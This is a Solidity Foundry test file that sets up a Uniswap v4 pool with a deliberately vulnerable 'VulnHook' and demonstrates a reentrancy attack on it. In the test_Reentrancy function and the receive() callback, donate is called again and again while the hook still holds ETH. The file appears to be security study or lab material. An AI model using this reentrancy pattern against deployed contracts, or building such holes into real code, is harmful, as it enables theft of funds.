// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Test Related Contracts
import "forge-std/Test.sol";
import {MockERC20} from "v4-core/lib/solmate/src/test/utils/mocks/MockERC20.sol";
import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
import {Constants} from "v4-core/test/utils/Constants.sol";
import {SortTokens} from "v4-core/test/utils/SortTokens.sol";
import { console } from "forge-std/console.sol";
import {PoolInitializeTest} from "v4-core/src/test/PoolInitializeTest.sol";

import {FeeLibrary} from "v4-core/src/libraries/FeeLibrary.sol";
import {PoolModifyPositionTest} from "v4-core/src/test/PoolModifyPositionTest.sol";
import {PoolDonateTest} from "v4-core/src/test/PoolDonateTest.sol";
import {PoolTakeTest} from "v4-core/src/test/PoolTakeTest.sol";
import {ProtocolFeeControllerTest} from "v4-core/src/test/ProtocolFeeControllerTest.sol";

//interfaces
import {IERC20Minimal} from "v4-core/src/interfaces/external/IERC20Minimal.sol";
import {ILockCallback} from "v4-core/src/interfaces/callback/ILockCallback.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";

//libraries
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {Hooks} from "v4-core/src/libraries/Hooks.sol";

// Pool Contracts
import {BalanceDelta, BalanceDeltaLibrary} from "v4-core/src/types/BalanceDelta.sol";
import {CurrencyLibrary, Currency} from "v4-core/src/types/Currency.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";


// Vulnerable Hook Contract 
import {VulnHook} from "./VulnHook.sol";

library HookMiner {
    uint160 constant FLAG_MASK = 0xFFF << 148;

    uint256 constant MAX_LOOP = 20_000;

    function find(address deployer, uint160 flags, bytes memory creationCode, bytes memory constructorArgs)
        external
        view
        returns (address, bytes32)
    {
        address hookAddress;
        bytes memory creationCodeWithArgs = abi.encodePacked(creationCode, constructorArgs);

        uint256 salt;
        for (salt; salt < MAX_LOOP; salt++) {
            hookAddress = computeAddress(deployer, salt, creationCodeWithArgs);
            if (uint160(hookAddress) & FLAG_MASK == flags && hookAddress.code.length == 0) {
                return (hookAddress, bytes32(salt));
            }
        }
        revert("Could not find salt");
    }

    function computeAddress(address deployer, uint256 salt, bytes memory creationCode)
        public
        pure
        returns (address hookAddress)
    {
        return address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xFF), deployer, salt, keccak256(creationCode)))))
        );
    }
}

contract Deployers {
    using FeeLibrary for uint24;
    using PoolIdLibrary for PoolKey;

    // Helpful test constants
    bytes constant ZERO_BYTES = new bytes(0);
    uint160 constant SQRT_RATIO_1_1 = Constants.SQRT_RATIO_1_1;
    uint160 constant SQRT_RATIO_1_2 = Constants.SQRT_RATIO_1_2;
    uint160 constant SQRT_RATIO_1_4 = Constants.SQRT_RATIO_1_4;
    uint160 constant SQRT_RATIO_4_1 = Constants.SQRT_RATIO_4_1;

    IPoolManager.ModifyPositionParams internal LIQ_PARAMS =
        IPoolManager.ModifyPositionParams({tickLower: -120, tickUpper: 120, liquidityDelta: 1e18});

    // Global variables
    Currency internal currency0;
    Currency internal currency1;
    PoolManager manager;
    PoolModifyPositionTest modifyPositionRouter;
    PoolSwapTest swapRouter;
    PoolDonateTest donateRouter;
    PoolTakeTest takeRouter;
    PoolInitializeTest initializeRouter;
    ProtocolFeeControllerTest feeController;

    PoolKey key;
    PoolKey nativeKey;
    PoolKey uninitializedKey;
    PoolKey uninitializedNativeKey;

    function deployFreshManager() internal {
        manager = new PoolManager(500000);
    }

    function deployFreshManagerAndRouters() internal {
        deployFreshManager();
        swapRouter = new PoolSwapTest(manager);
        modifyPositionRouter = new PoolModifyPositionTest(manager);
        donateRouter = new PoolDonateTest(manager);
        takeRouter = new PoolTakeTest(manager);
        initializeRouter = new PoolInitializeTest(manager);
        feeController = new ProtocolFeeControllerTest();
        manager.setProtocolFeeController(feeController);
    }

    function deployMintAndApprove2Currencies() internal returns (Currency, Currency) {
        MockERC20[] memory tokens = deployTokens(2, 1000 ether);

        address[4] memory toApprove =
            [address(swapRouter), address(modifyPositionRouter), address(donateRouter), address(takeRouter)];

        for (uint256 i = 0; i < toApprove.length; i++) {
            tokens[0].approve(toApprove[i], 1000 ether);
            tokens[1].approve(toApprove[i], 1000 ether);
        }

        return SortTokens.sort(tokens[0], tokens[1]);
    }

    function deployTokens(uint8 count, uint256 totalSupply) internal returns (MockERC20[] memory tokens) {
        tokens = new MockERC20[](count);
        for (uint8 i = 0; i < count; i++) {
            tokens[i] = new MockERC20("TEST", "TEST", 18);
            tokens[i].mint(address(this), totalSupply);
        }
    }

    function initPool(
        Currency _currency0,
        Currency _currency1,
        IHooks hooks,
        uint24 fee,
        uint160 sqrtPriceX96,
        bytes memory initData
    ) internal returns (PoolKey memory _key, PoolId id) {
        _key = PoolKey(_currency0, _currency1, fee, fee.isDynamicFee() ? int24(60) : int24(fee / 100 * 2), hooks);
        id = _key.toId();
        initializeRouter.initialize(_key, sqrtPriceX96, initData);
    }

    function initPoolAndAddLiquidity(
        Currency _currency0,
        Currency _currency1,
        IHooks hooks,
        uint24 fee,
        uint160 sqrtPriceX96,
        bytes memory initData
    ) internal returns (PoolKey memory _key, PoolId id) {
        (_key, id) = initPool(_currency0, _currency1, hooks, fee, sqrtPriceX96, initData);
        modifyPositionRouter.modifyPosition{value: msg.value}(_key, LIQ_PARAMS, ZERO_BYTES);
    }

    function initPoolAndAddLiquidityETH(
        Currency _currency0,
        Currency _currency1,
        IHooks hooks,
        uint24 fee,
        uint160 sqrtPriceX96,
        bytes memory initData,
        uint256 msgValue
    ) internal returns (PoolKey memory _key, PoolId id) {
        (_key, id) = initPool(_currency0, _currency1, hooks, fee, sqrtPriceX96, initData);
        modifyPositionRouter.modifyPosition{value: msgValue}(_key, LIQ_PARAMS, ZERO_BYTES);
    }

    // Deploys the manager, all test routers, and sets up 2 pools: with and without native
    function initializeManagerRoutersAndPoolsWithLiq(IHooks hooks) internal {
        deployFreshManagerAndRouters();
        // sets the global currencyies and key
        (currency0, currency1) = deployMintAndApprove2Currencies();
        (key,) = initPoolAndAddLiquidity(currency0, currency1, hooks, 3000, SQRT_RATIO_1_1, ZERO_BYTES);
        (nativeKey,) = initPoolAndAddLiquidityETH(
            CurrencyLibrary.NATIVE, currency1, hooks, 3000, SQRT_RATIO_1_1, ZERO_BYTES, 1 ether
        );
        uninitializedKey = key;
        uninitializedNativeKey = nativeKey;
        uninitializedKey.fee = 100;
        uninitializedNativeKey.fee = 100;
    }
}

contract VulnHookTest is Test, Deployers, ILockCallback{
    using PoolIdLibrary for PoolKey;
    using CurrencyLibrary for Currency;
    using Hooks for IHooks;

    VulnHook vulnHook;
    PoolId poolId;

    struct CallbackData {
        address sender;
        PoolKey key;
        uint256 amount0;
        uint256 amount1;
        bytes hookData;
    }

    function setUp() public {
        // creates the pool manager, utility routers, and test tokens
        Deployers.deployFreshManagerAndRouters();
        (currency0, currency1) = Deployers.deployMintAndApprove2Currencies();

        // Deploy the hook to an address with the correct flags
        uint160 flags = uint160(
            Hooks.BEFORE_DONATE_FLAG
        );
        (address hookAddress, bytes32 salt) =
            HookMiner.find(address(this), flags, type(VulnHook).creationCode, abi.encode(address(manager)));
        vulnHook = new VulnHook{salt: salt}(IPoolManager(address(manager)));
        require(address(vulnHook) == hookAddress, "VulnHookTest: hook address mismatch");

        // Create the pool
        key = PoolKey(currency0, currency1, 3000, 60, IHooks(vulnHook));
        poolId = key.toId();
        initializeRouter.initialize(key, SQRT_RATIO_1_1, ZERO_BYTES);

        // Provide liquidity to the pool
        console.log("Providing liquidity to the pool");
        modifyPositionRouter.modifyPosition(key, IPoolManager.ModifyPositionParams(-60, 60, 10 ether), ZERO_BYTES);
    }

    function donate(PoolKey memory key, uint256 amount0, uint256 amount1, bytes memory hookData)
        public
        payable
        returns (BalanceDelta delta)
    {
        delta = abi.decode(
            manager.lock(abi.encode(CallbackData(msg.sender, key, amount0, amount1, hookData))),
            (BalanceDelta)
        );

        //uint256 ethBalance = address(this).balance;
        //if (ethBalance > 0) {
        //    CurrencyLibrary.NATIVE.transfer(msg.sender, ethBalance);
        //}
    }

    function lockAcquired(bytes calldata rawData) external returns (bytes memory) {
        require(msg.sender == address(manager));

        CallbackData memory data = abi.decode(rawData, (CallbackData));

        (,, uint256 reserveBefore0, int256 deltaBefore0) = _fetchBalances(data.key.currency0, data.sender);
        (,, uint256 reserveBefore1, int256 deltaBefore1) = _fetchBalances(data.key.currency1, data.sender);

        //assertEq(deltaBefore0, 0);
        //assertEq(deltaBefore1, 0);

        BalanceDelta delta = manager.donate(data.key, data.amount0, data.amount1, data.hookData);

        (,, uint256 reserveAfter0, int256 deltaAfter0) = _fetchBalances(data.key.currency0, data.sender);
        (,, uint256 reserveAfter1, int256 deltaAfter1) = _fetchBalances(data.key.currency1, data.sender);

        //assertEq(reserveBefore0, reserveAfter0);
        //assertEq(reserveBefore1, reserveAfter1);

        if (delta == BalanceDeltaLibrary.MAXIMUM_DELTA) {
            // Check that this hook is allowed to NoOp, then we can return as we dont need to settle
            assertTrue(data.key.hooks.hasPermissionToNoOp(), "Invalid NoOp returned");
            return abi.encode(delta);
        }

        //assertEq(deltaAfter0, int256(data.amount0));
        //assertEq(deltaAfter1, int256(data.amount1));

        if (data.amount0 > 0) _settle(data.key.currency0, data.sender, delta.amount0(), true);
        if (data.amount1 > 0) _settle(data.key.currency1, data.sender, delta.amount1(), true);

        return abi.encode(delta);
    }

    function test_Reentrancy() public{
        // Fund Hook Contract
        vulnHook.fund{value: 5 wei}();    
        console.log("hook balance", address(vulnHook).balance);
        console.log("test balance", address(this).balance);

        // perform donate
        donate(key,100,100,ZERO_BYTES);

        console.log("hook balance", address(vulnHook).balance);
        console.log("test balance", address(this).balance);   
    }

    receive() external payable {
        console.log("hook balance", address(vulnHook).balance);
        console.log("test balance", address(this).balance);   
        if (address(vulnHook).balance >= 1 wei) {
            console.log("Inside receive");
            donate(key,100,100,ZERO_BYTES);
        }
        else{
            console.log("End");
        }
    }
  
    // Helper
    function _take(Currency currency, address recipient, int128 amount, bool withdrawTokens) internal {
        assert(amount < 0);
        if (withdrawTokens) {
            manager.take(currency, recipient, uint128(-amount));
        } else {
            manager.mint(currency, address(this), uint128(-amount));
        }
    }

    function _settle(Currency currency, address payer, int128 amount, bool settleUsingTransfer) internal {
        assert(amount > 0);
        if (settleUsingTransfer) {
            if (currency.isNative()) {
                manager.settle{value: uint128(amount)}(currency);
            } else {
                IERC20Minimal(Currency.unwrap(currency)).transfer(address(manager), uint128(amount));
                //IERC20Minimal(Currency.unwrap(currency)).transferFrom(payer, address(manager), uint128(amount));
                manager.settle(currency);
            }
        } else {
            manager.burn(currency, uint128(amount));
        }
    }

    function _fetchBalances(Currency currency, address user)
        internal
        view
        returns (uint256 userBalance, uint256 poolBalance, uint256 reserves, int256 delta)
    {
        userBalance = currency.balanceOf(user);
        poolBalance = currency.balanceOf(address(manager));
        reserves = manager.reservesOf(currency);
        delta = manager.currencyDelta(address(this), currency);
    }
    
}
